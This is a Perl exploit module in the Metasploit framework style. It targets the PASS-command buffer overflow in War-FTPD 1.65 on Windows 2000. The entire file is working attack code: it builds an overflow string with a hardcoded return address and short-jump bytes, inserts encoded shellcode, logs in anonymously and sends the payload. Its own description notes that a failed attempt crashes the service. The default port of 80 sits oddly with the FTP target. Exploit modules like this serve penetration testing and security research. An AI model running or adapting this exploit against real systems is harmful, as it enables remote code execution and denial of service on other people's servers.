package Msf::Exploit::warftpd_165_pass;
use base "Msf::Exploit";
use strict;

my $advanced = { };
my $info =
{
    'Name'  => 'War-FTPD 1.65 PASS Overflow',
    'Version'  => '$Revision: 1.14 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 512,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
                 },
    
    'Description'  =>  qq{

        This exploits the buffer overflow found in the PASS command
        in War-FTPD 1.65. This particular module will only work
        reliably against Windows 2000 targets. The server must be
        configured to allow anonymous logins for this exploit to
        succeed. A failed attempt will bring down the service
        completely.    
    },
    'Refs'  =>  [  
                    'http://www.osvdb.org/875',
		            'http://lists.insecure.org/lists/bugtraq/1998/Feb/0014.html'
                ],
    'DefaultTarget' => 0,
    'Targets' => [ ["Windows 2000"] ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $request = ("META" x 1024);

    # this return address is a jmp ebx in the included MFC42.DLL
    substr($request, 562, 4, pack("V", 0x5f4e772b));
    
    substr($request, 558, 4, "\xeb\x08\xeb\x08");
    substr($request, 566, length($shellcode), $shellcode);


    my $s = Msf::Socket->new();

    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("[*] Could not connect to $target_host:$target_port.");
        return;
    }

    my $r = $s->Recv(-1, 20);
    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
    
    $self->PrintLine("[*] REMOTE> $r");
    $r = $s->Recv(-1, 10);
    
    $s->Send("USER ANONYMOUS\n");
    $r = $s->Recv(-1, 20);
    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
    $self->PrintLine("[*] REMOTE> $r");
    
    $s->Send("PASS $request\n");
    $r = $s->Recv(-1, 20);
    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
    $self->PrintLine("[*] REMOTE> $r");
    
    return;
}



